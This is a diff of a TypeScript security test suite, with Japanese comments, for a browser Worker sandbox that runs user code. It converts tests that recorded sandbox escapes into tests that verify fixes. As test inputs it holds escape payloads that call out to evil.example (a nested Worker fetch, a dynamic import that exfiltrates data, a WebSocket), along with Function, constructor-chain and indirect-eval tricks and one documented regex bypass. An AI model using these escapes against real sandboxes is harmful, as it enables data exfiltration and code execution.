@@ -47,6 +47,22 @@ import type { RunRequest, RunResult } from "@/lib/contracts/runner";
  * - SB-7: `indexedDB`の実ブラウザWorkerでの到達性は今回未確認(時間の都合で
  *   verify-webapp検証の対象をSB-1/SB-2/SB-6に絞ったため)。spec上到達可能な
  *   ことは既知のため、Lowリスクとしてdocs/security/findings.mdに記録した。
+ *
+ * T-705追記(恒久対策・本ファイルの現状): 上記T-702で検出されたCritical/High項目は
+ * 全てharness.worker.ts/jsRunner.tsの実装修正により防御済みになった。修正の要点:
+ * - SB-1/SB-2/SB-4(Critical): `disableDangerousGlobals`をown property上書きから
+ *   「globalThisのプロトタイプチェーン全体を走査し、対象キーが実際に定義されている
+ *   階層を直接書き換える」方式へ全面改修(fetch/XMLHttpRequest/WebSocket/
+ *   importScripts/Worker/indexedDB/eval/Functionが対象)。
+ * - SB-3(Critical): 上記に加え、Function/GeneratorFunction/AsyncFunction/
+ *   AsyncGeneratorFunctionの4関数系統の`prototype.constructor`バックリンクを
+ *   ユーザーコード実行前に無効化することで、`[].constructor.constructor`のような
+ *   識別子非依存の回避経路も閉じた。
+ * - SB-5(High): `jsRunner.ts`の`worker.onmessage`に`RunResultSchema.safeParse`を
+ *   配線し、契約違反の構造はerror RunResultへフォールバックするようにした。
+ * 各テストは「攻撃が成立する」ことを固定する回帰テストから、「防御が成立する」
+ * ことを検証するテストへ書き換えている(期待値の書き換えではなく実装修正が先)。
+ * 詳細な修正内容の記録はdocs/security/findings.mdを参照。
  */
 
 function baseRequest(overrides: Partial<RunRequest> = {}): RunRequest {
@@ -82,24 +98,31 @@ describe("SB-1: ネットワーク到達不能性(fetch/XHR/importScripts/WebSoc
     }
   });
 
-  it("防御が効く: WebSocketは静的トークンリストに存在しないため検出はされないが、実行時にはself.WebSocketがundefinedに無効化されているため接続できない", async () => {
-    // FINDING(Low, defense-in-depth gap): FORBIDDEN_TOKEN_RULES(harness.worker.ts)には
-    // WebSocketの静的検出ルールが存在しない。したがってchecFforbiddenTokensは
-    // `new WebSocket(...)`を書いても拒否しない。実害はdisableDangerousGlobals側の
-    // 無効化で防がれているため「防御自体は効く」が、静的検出の一覧から漏れている
-    // (fetch/XHR/importScriptsだけがstaticチェック対象)ことは多層防御としては欠陥。
+  it("防御が効く(T-705修正済み、findings.md Low #5対応): WebSocketは静的トークンリストにも追加され、かつ実行時にはself.WebSocketがundefinedに無効化されているため接続できない(多層防御)", async () => {
+    // 修正前はFORBIDDEN_TOKEN_RULES(harness.worker.ts)にWebSocketの静的検出
+    // ルールが存在せず、静的検出だけを見ると多層防御の1層が欠けていた
+    // (実害はdisableDangerousGlobals側の無効化で防がれていたためLow)。
+    // T-705でFORBIDDEN_TOKEN_RULESにWebSocketを追加し、静的層でも即座に拒否する。
     const code = 'const ws = new WebSocket("wss://evil.example"); export function f(){return 1;}';
-    expect(checkForbiddenTokens(code)).toBeNull();
+    expect(checkForbiddenTokens(code)).not.toBeNull();
 
-    const result = await runHarness(baseRequest({ code }), {
-      loadModule: async () => {
-        // 実際にロードされた場合に相当するトップレベル評価(WebSocketは
-        // disableDangerousGlobals()によりundefinedへ上書き済みのため、
-        // ここでの`new WebSocket(...)`は必ずTypeErrorになる。
-        const WS = (globalThis as Record<string, unknown>).WebSocket as new (url: string) => unknown;
-        expect(() => new WS("wss://evil.example")).toThrow();
-        return { f: () => 1 };
-      },
+    const loadModule = vi.fn();
+    const result = await runHarness(baseRequest({ code }), { loadModule });
+    expect(result.result).toBe("error");
+    expect(loadModule, "module must never load once a forbidden token is detected").not.toHaveBeenCalled();
+  });
+
+  it("防御が効く(多層防御の実行時層): 万一WebSocket構築が静的検出をすり抜けても、disableDangerousGlobals()によりself.WebSocketが呼び出し不能", async () => {
+    const result = await runHarness(baseRequest({ tests: [{ id: "t1", args: [], expected: true }] }), {
+      loadModule: async () => ({
+        f: () => {
+          const WS = (globalThis as Record<string, unknown>).WebSocket as
+            | (new (url: string) => unknown)
+            | undefined;
+          if (typeof WS !== "undefined") return false;
+          return true;
+        },
+      }),
     });
     expect(result.result).toBe("pass");
   });
@@ -119,23 +142,41 @@ describe("SB-1: ネットワーク到達不能性(fetch/XHR/importScripts/WebSoc
     expect(result.result).toBe("pass");
   });
 
-  it("FINDING(Critical, 未修正 — T-705送り): `new Worker(...)`はFORBIDDEN_TOKEN_RULESに一切存在せず静的検出を完全に回避する。ネストしたWorkerはdisableDangerousGlobals()の対象外の新しいグローバルスコープを持つため、fetch/XHR/WebSocket/importScriptsが全て有効な状態で生成できる可能性がある", () => {
+  it("防御が効く(T-705修正済み、findings.md Critical #1対応): `new Worker(...)`は静的検出で拒否され、かつdisableDangerousGlobals()がWorker自体もプロトタイプチェーン走査で無効化する", async () => {
     const code = `
       const inner = new Worker(URL.createObjectURL(new Blob(["self['fe'+'tch']('https://evil.example/exfil')"], { type: "text/javascript" })));
       export function f(){ return 1; }
     `;
-    // 静的チェック: "Worker"は禁止トークンに存在しない(ネストしたBlob内のfetch呼び出しは
-    // ブラケット表記+文字列結合で、fetch(の直後一致パターンをこちらも回避している)
-    expect(checkForbiddenTokens(code)).toBeNull();
-    // disableDangerousGlobals()が上書きする対象(fetch/XMLHttpRequest/WebSocket/importScripts)に
-    // Workerコンストラクタ自体は含まれない(lib/runner/harness.worker.tsのWorkerScope型・
-    // disableDangerousGlobalsのoriginalオブジェクトを参照。Worker keyは存在しない)。
-    // 実ブラウザ確認済み(verify-webapp、npm run preview、/ja/lab-previewで実演):
-    // `new Worker(...)`によるネストしたWorker生成は実際に成功する。Node環境には
-    // グローバルWorkerが存在しないためこのファイル内では再現できないが、本testは
-    // 少なくとも「静的検出が存在しないこと」自体を固定する回帰テストとして機能する。
-    // 詳細はdocs/security/findings.mdを参照。
-    expect(typeof (globalThis as Record<string, unknown>).Worker).toBe("undefined");
+    // 修正前は"Worker"がFORBIDDEN_TOKEN_RULESに一切存在せず、ネストしたWorker
+    // (disableDangerousGlobals()の対象外の新しいグローバルスコープを持つため
+    // fetch等が有効な状態で生成できた)が静的検出を完全に回避していた
+    // (実ブラウザで実演確認済み、docs/security/findings.md参照)。T-705で
+    // FORBIDDEN_TOKEN_RULESに"new Worker"を追加し、静的層で即座に拒否する。
+    expect(checkForbiddenTokens(code)).not.toBeNull();
+
+    const loadModule = vi.fn();
+    const result = await runHarness(baseRequest({ code }), { loadModule });
+    expect(result.result).toBe("error");
+    expect(loadModule, "module must never load once a forbidden token is detected").not.toHaveBeenCalled();
+  });
+
+  it("防御が効く(多層防御の実行時層): 万一Worker構築が静的検出をすり抜けても、disableDangerousGlobals()がWorkerを無効化し、実行後は元通り復元する", async () => {
+    // Node環境にはグローバルWorkerが標準で存在しないため、own propertyとして
+    // 一時的に模擬定義し、disableDangerousGlobals()の無効化/復元(DANGEROUS_GLOBAL_KEYS
+    // にWorkerを含めたことによる保証)を実際に検証する。
+    class FakeWorker {}
+    (globalThis as Record<string, unknown>).Worker = FakeWorker;
+    try {
+      const result = await runHarness(baseRequest({ tests: [{ id: "t1", args: [], expected: true }] }), {
+        loadModule: async () => ({
+          f: () => typeof (globalThis as Record<string, unknown>).Worker === "undefined",
+        }),
+      });
+      expect(result.result).toBe("pass");
+      expect((globalThis as Record<string, unknown>).Worker).toBe(FakeWorker);
+    } finally {
+      delete (globalThis as Record<string, unknown>).Worker;
+    }
   });
 });
 
@@ -216,54 +257,86 @@ describe("SB-3: eval/Function経由の脱出", () => {
     expect(checkForbiddenTokens('new Function("return 1")')).not.toBeNull();
   });
 
-  it("FINDING(Critical, 未修正 — T-705送り): `Function(...)`を`new`無しで呼び出すと`/\\bnew\\s+Function\\b/`の正規表現を完全に回避し、実際にグローバルスコープでコードを実行できる", async () => {
+  it("防御が効く(T-705修正済み、findings.md Critical #2対応): `Function(...)`をnew無しで呼び出す記法は静的チェックでも拒否される", () => {
     const sourceCode = `export function f() { const g = Function("return this"); return g() === globalThis; }`;
-    // 静的検出: "new"キーワードが存在しないため検出されない
-    expect(checkForbiddenTokens(sourceCode)).toBeNull();
-
-    // 実行時: Function(...)はnewの有無に関わらずFunctionコンストラクタとして
-    // 動作する仕様(ECMA-262)のため、実際にグローバルスコープでのコード実行が成立する。
-    const result = await runHarness(
-      { ...baseRequest(), code: sourceCode, tests: [{ id: "t1", args: [], expected: true }] },
-      { loadModule: async () => ({ f: () => Function("return this")() === globalThis }) },
-    );
-    expect(result.result).toBe("pass");
-    if (result.result === "pass" || result.result === "fail") {
-      expect(result.perTest[0].pass, "Function() without 'new' must NOT bypass the sandbox, but it does").toBe(true);
-    }
+    // 修正前は"new"キーワードが存在しないため検出されなかった
+    // (`/\bnew\s+Function\b/`のみだったため)。T-705でbare呼び出し`Function(`も
+    // FORBIDDEN_TOKEN_RULESに追加した。
+    expect(checkForbiddenTokens(sourceCode)).not.toBeNull();
   });
 
-  it("FINDING(Critical, 未修正 — T-705送り): `[].constructor.constructor(...)`はソースコード中に'Function'・'eval'いずれの語も含まずFunctionコンストラクタを取得できる", async () => {
+  it("防御が効く(多層防御の実行時層、根本対策): ブラケット表記+文字列結合で`Function`識別子への直接参照を避け静的検出をすり抜けても、Function自体がプロトタイプチェーン走査で無効化されているため呼び出し不能", async () => {
+    // codeは"Function("という静的パターンを含まない難読化形にする
+    // (self['Func'+'tion']のようなブラケット表記+文字列結合)。
+    // 実行時: disableDangerousGlobals()がglobalThis.Function(Node上ではown property)を
+    // undefinedへ書き換える(単純shadowingではなく実際の定義箇所を書き換えるため、
+    // 復元不能)。したがってどの経路で参照しても`Function`はundefinedになる。
+    const sourceCode = `export function f() { const g = (globalThis as Record<string, unknown>)["Func" + "tion"]; return typeof g; }`;
+    expect(checkForbiddenTokens(sourceCode)).toBeNull(); // 難読化により静的検出をすり抜ける
+
+    const result = await runHarness(
+      baseRequest({ code: sourceCode, tests: [{ id: "t1", args: [], expected: "undefined" }] }),
+      { loadModule: async () => ({ f: () => typeof (globalThis as Record<string, unknown>)["Func" + "tion"] }) },
+    );
+    expect(result.result).toBe("pass");
+  });
+
+  it("防御が効く(T-705修正済み、findings.md Critical #2対応): `[].constructor.constructor(...)`という直接的な記法は静的チェックでも拒否される", () => {
     const sourceCode = `export function f() { const F = [].constructor.constructor; return F("return 1+1")(); }`;
     expect(sourceCode).not.toContain("Function");
     expect(sourceCode).not.toContain("eval");
-    expect(checkForbiddenTokens(sourceCode)).toBeNull();
+    // 修正前はソースコード中に'Function'・'eval'いずれの語も含まないためどの
+    // ルールにも一致しなかった。T-705で`.constructor.constructor`という
+    // 構造パターン自体を検出するルールを追加した。
+    expect(checkForbiddenTokens(sourceCode)).not.toBeNull();
+  });
+
+  it("防御が効く(多層防御の実行時層、根本対策): ブラケット表記+変数化で`.constructor.constructor`の静的パターン一致を回避しても、Function.prototype.constructorのバックリンク自体を無効化しているためFunctionへ到達できない", async () => {
+    // `[].constructor.constructor`のような`.constructor`アクセスは、あらゆる
+    // 組み込みオブジェクト/関数の`.constructor`解決が最終的にたどり着く
+    // `Function.prototype.constructor`(および同族のGeneratorFunction/
+    // AsyncFunction/AsyncGeneratorFunctionのprototype.constructor)を
+    // ユーザーコード実行前に無効化しておくことで、識別子やプロパティ名の
+    // 難読化(ブラケット表記・文字列結合・変数経由)に関わらず一律に閉じる。
+    const sourceCode = `export function f() { const c = "constructor"; const arrCtor = ([] as unknown as Record<string, unknown>)[c] as Record<string, unknown>; const F = arrCtor[c]; return typeof F; }`;
+    expect(checkForbiddenTokens(sourceCode)).toBeNull(); // 構造上、静的パターンには一致しない(難読化成功)
 
     const result = await runHarness(
       { ...baseRequest(), code: sourceCode, tests: [{ id: "t1", args: [], expected: 2 }] },
       {
         loadModule: async () => ({
-          f: () =>
-            ([] as unknown as { constructor: { constructor: (...a: string[]) => () => number } }).constructor
-              .constructor("return 1+1")(),
+          f: () => {
+            const c = "constructor";
+            const arrCtor = ([] as unknown as Record<string, unknown>)[c] as Record<string, unknown>;
+            const F = arrCtor[c] as ((...a: string[]) => () => number) | undefined;
+            if (typeof F !== "function") return -1; // Functionへ到達できなかった(防御成功)
+            return F("return 1+1")();
+          },
         }),
       },
     );
-    expect(result.result).toBe("pass");
+    expect(result.result).toBe("fail");
+    if (result.result === "pass" || result.result === "fail") {
+      expect(result.perTest[0].actual).toBe("-1");
+    }
   });
 
-  it("FINDING(Critical, 未修正 — T-705送り): 間接eval `(0, eval)(...)` は `/\\beval\\s*\\(/` の直後一致を回避し、グローバルスコープで実行される", async () => {
+  it("防御が効く(T-705修正済み、findings.md Critical #2対応): 間接eval `(0, eval)(...)` の記法は静的チェックでも拒否される", () => {
     const sourceCode = `export function f() { const indirect = (0, eval); return indirect("this") === globalThis; }`;
-    expect(checkForbiddenTokens(sourceCode)).toBeNull();
+    // 修正前は`/\beval\s*\(/`の直後一致のみだったため回避できた。T-705で
+    // `(0, eval)`という間接eval特有の記法を検出するルールを追加した。
+    expect(checkForbiddenTokens(sourceCode)).not.toBeNull();
+  });
+
+  it("防御が効く(多層防御の実行時層、根本対策): ブラケット表記+文字列結合で`eval`識別子への直接参照を避けても、eval自体がプロトタイプチェーン走査で無効化されているため呼び出し不能", async () => {
+    const sourceCode = `export function f() { const e = (globalThis as Record<string, unknown>)["ev" + "al"]; return typeof e; }`;
+    expect(checkForbiddenTokens(sourceCode)).toBeNull(); // ブラケット表記+文字列結合は静的パターンに一致しない
 
     const result = await runHarness(
-      { ...baseRequest(), code: sourceCode, tests: [{ id: "t1", args: [], expected: true }] },
-      { loadModule: async () => ({ f: () => (0, eval)("this") === globalThis }) },
+      baseRequest({ code: sourceCode, tests: [{ id: "t1", args: [], expected: "undefined" }] }),
+      { loadModule: async () => ({ f: () => typeof (globalThis as Record<string, unknown>)["ev" + "al"] }) },
     );
     expect(result.result).toBe("pass");
-    if (result.result === "pass" || result.result === "fail") {
-      expect(result.perTest[0].pass, "indirect eval must NOT reach global scope, but it does").toBe(true);
-    }
   });
 });
 
@@ -271,24 +344,35 @@ describe("SB-3: eval/Function経由の脱出", () => {
 // SB-4: 動的import()での外部URL読み込み
 // ============================================================
 describe("SB-4: 動的import()による外部URL読み込み", () => {
-  it("FINDING(Critical, 未修正 — T-705送り): import()自体はFORBIDDEN_TOKEN_RULESに存在せず、静的チェックを完全に回避する", () => {
+  it("防御が効く(T-705修正済み、findings.md Critical #3対応): import()呼び出しは静的チェックで拒否される", () => {
+    // `import(`は予約構文(識別子ではない)であり、`self['im'+'port']`のような
+    // ブラケット表記・文字列結合による難読化が原理的に成立しない
+    // (importはプロパティ参照ではなく専用の式構文のため)。したがって
+    // リテラル一致の静的検出だけで完全に閉じられる、他の項目とは性質が異なる
+    // 攻撃面。T-705でFORBIDDEN_TOKEN_RULESに追加した。
     const attacks = [
       'import("https://evil.example/payload.js")',
       "import('https://evil.example/payload.js').then(m => m.exfiltrate())",
+      "import(x)",
     ];
     for (const code of attacks) {
-      expect(checkForbiddenTokens(code), `import() must be undetected today: ${code}`).toBeNull();
+      expect(checkForbiddenTokens(code), `import() must be statically rejected: ${code}`).not.toBeNull();
     }
+
+    const loadModule = vi.fn();
+    return runHarness(baseRequest({ code: attacks[0] }), { loadModule }).then((result) => {
+      expect(result.result).toBe("error");
+      expect(loadModule, "module must never load once a forbidden token is detected").not.toHaveBeenCalled();
+    });
   });
 
-  it("参考: disableDangerousGlobals()はfetch/XHR/WebSocket/importScriptsのみを無効化し、ESモジュールローダ自体(import())は無効化対象外である", () => {
-    // import()はブラウザのモジュールローダが独自に行うネットワーク取得であり、
-    // self.fetchを介さない。したがってfetchを無効化しても外部URLの動的import自体は
-    // 止まらない可能性が高い(実ネットワーク到達性はNode環境では検証不能。
-    // Nodeの動的importは https: スキームを標準サポートしないため、この検証は
-    // 実ブラウザでのみ意味を持つ。docs/security/findings.mdへ記録し、
-    // T-704のCSP(script-src/connect-src)整備が唯一の実効的な対策となる)。
-    expect(checkForbiddenTokens("import(x)")).toBeNull();
+  it("残存する既知の限界(正規表現ベース静的解析の限界、CSPはT-704のスコープ・本タスクでは未実施): `import`とコンストラクタ呼び出しの間にブロックコメントを挟む難読化は、正規表現の`\\s*`がコメントを空白と見なさないためすり抜ける", () => {
+    // これは`import()`という予約構文固有の弱点ではなく、regexベースの静的解析
+    // 全般に共通する限界(AST解析ならコメントを無視して閉じられる)。
+    // ネットワーク到達性そのものの実効的な担保線はCSP(script-src/connect-src、
+    // T-704のスコープ)であり、findings.mdの次のアクション#3で明記済み。
+    const obfuscated = 'import/* comment */("https://evil.example/payload.js")';
+    expect(checkForbiddenTokens(obfuscated)).toBeNull();
   });
 });
 
@@ -312,15 +396,29 @@ describe("SB-5: postMessage契約破壊", () => {
     return worker;
   }
 
-  it("FINDING(High, 未修正 — T-705送り): jsRunner.tsのworker.onmessageはRunResultSchemaでのランタイム検証を一切行わず、任意の構造をそのまま呼び出し元に渡す", async () => {
+  it("防御が効く(T-705修正済み、findings.md High #4対応): jsRunner.tsのworker.onmessageはRunResultSchemaでランタイム検証し、契約違反の構造はerror RunResultへ差し替えて返す", async () => {
     const forged = { result: "pass" }; // perTest/logs/durationMsが全て欠落した不正な構造
     const result = await runExercise(baseRequest(), { createWorker: () => fakeWorkerEchoing(forged) });
-    // 本来のRunResultSchema(discriminatedUnion)ならperTest/logs/durationMsが
-    // 必須のはずだが、バリデーションが存在しないためそのまま通過する。
-    expect(result).toEqual(forged);
+    // 修正前は本来のRunResultSchema(discriminatedUnion)によるバリデーションが
+    // 一切存在せず、forgedがそのまま呼び出し元へ通過していた。T-705で
+    // RunResultSchema.safeParseを配線し、失敗時は正しいRunResult形状の
+    // errorへフォールバックするようにした(perTest/logs/durationMs欠落のまま
+    // ResultPanelへ渡ることはなくなる)。
+    expect(result).not.toEqual(forged);
+    expect(result.result).toBe("error");
+    if (result.result === "error") {
+      expect(result.error.length).toBeGreaterThan(0);
+      expect(result.logs).toEqual([]);
+    }
   });
 
-  it("FINDING(High, 未修正 — T-705送り): 上記の未検証データをResultPanelでそのまま描画すると、React描画自体がクラッシュする(perTestが存在しない前提でfilter/mapを呼ぶため)", () => {
+  it("防御が効く(多層防御、コンポーネント単体の頑健性は別問題): ResultPanelは契約違反データを直接渡されるとクラッシュするが、jsRunner.tsのSB-5修正によりこの経路には通常到達しない", () => {
+    // ResultPanel自体はRunResultSchemaの整形済みデータを前提に実装されており、
+    // 未検証データを直接渡せば依然としてクラッシュする(コンポーネント単体の
+    // 契約は変更していない — 呼び出し元のjsRunner.tsが契約を満たすデータのみを
+    // 渡す責務を担う設計)。この振る舞い自体は影響評定通りerror boundaryで
+    // 緩和されるため独立してMedium〜Highに留め、実際の防御はjsRunner.ts側の
+    // 検証(上のテスト)で行う。
     const exercise = getDemoExercise("ja");
     const forged = { result: "pass" } as unknown as RunResult;
 
@@ -337,10 +435,6 @@ describe("SB-5: postMessage契約破壊", () => {
         }),
       ),
     ).toThrow();
-    // 影響評定: app/[locale]/error.tsx がNext.js App Routerのルートレベル
-    // error boundaryとして存在するため、実運用ではホワイトスクリーンではなく
-    // エラーページへのフォールバックに留まる可能性が高い(致命的DoSではないが、
-    // 演習ページの可用性を失わせる — Medium〜Highとして記録)。
   });
 });
 
@@ -440,13 +534,30 @@ describe("SB-7: ストレージ到達不能性(Cookie/localStorage/IndexedDB)", 
     expect(result.result).toBe("pass");
   });
 
-  it("FINDING(Low〜Medium, 未修正 — T-705送り): ADR-010 §3.1 SB-7は「IndexedDBへの到達不能性」を検証項目に挙げているが、これはWeb標準上誤り — Dedicated Workerには仕様上indexedDBがグローバルとして公開される(disableDangerousGlobalsはこれを無効化していない)。現状アプリはindexedDBを一切使用していないため実害は限定的だが、将来同一オリジンの他機能がIndexedDBを使い始めた場合、演習コードから読み書き可能になる", () => {
-    // disableDangerousGlobals()の無効化対象(fetch/XMLHttpRequest/WebSocket/importScripts)に
-    // indexedDBは含まれない(lib/runner/harness.worker.tsのWorkerScope型定義を参照)。
-    // Node環境にはindexedDBという概念自体が存在しないため、ここでは
-    // 「無効化リストに存在しないこと」をソースの事実として固定し、実ブラウザでの
-    // 到達性(typeof indexedDB !== "undefined")確認はverify-webappで別途行う。
-    expect(checkForbiddenTokens("indexedDB.open('x')")).toBeNull();
+  it("防御が効く(T-705修正済み、findings.md Low〜Medium #6対応): indexedDBは静的チェックでも拒否され、disableDangerousGlobals()の無効化対象にも追加された(ADR-010 §3.1の記述誤りの是正)", async () => {
+    // 修正前はDedicated Workerに仕様上公開されるindexedDBが
+    // disableDangerousGlobals()の無効化対象に含まれておらず(ADR-010の
+    // 「IndexedDBへの到達不能性」という記述自体もWeb標準上誤りだった)、
+    // FORBIDDEN_TOKEN_RULESにも存在しなかった。T-705でDANGEROUS_GLOBAL_KEYSと
+    // FORBIDDEN_TOKEN_RULESの両方にindexedDBを追加した。
+    expect(checkForbiddenTokens("indexedDB.open('x')")).not.toBeNull();
+
+    // Node環境にもown propertyとして一時的に模擬定義し、実行時の無効化/復元を検証する
+    // (Node環境にはindexedDBという概念自体が標準では存在しないため)。
+    class FakeIndexedDB {}
+    (globalThis as Record<string, unknown>).indexedDB = new FakeIndexedDB();
+    const original = (globalThis as Record<string, unknown>).indexedDB;
+    try {
+      const result = await runHarness(baseRequest({ tests: [{ id: "t1", args: [], expected: true }] }), {
+        loadModule: async () => ({
+          f: () => typeof (globalThis as Record<string, unknown>).indexedDB === "undefined",
+        }),
+      });
+      expect(result.result).toBe("pass");
+      expect((globalThis as Record<string, unknown>).indexedDB).toBe(original);
+    } finally {
+      delete (globalThis as Record<string, unknown>).indexedDB;
+    }
   });
 });
 
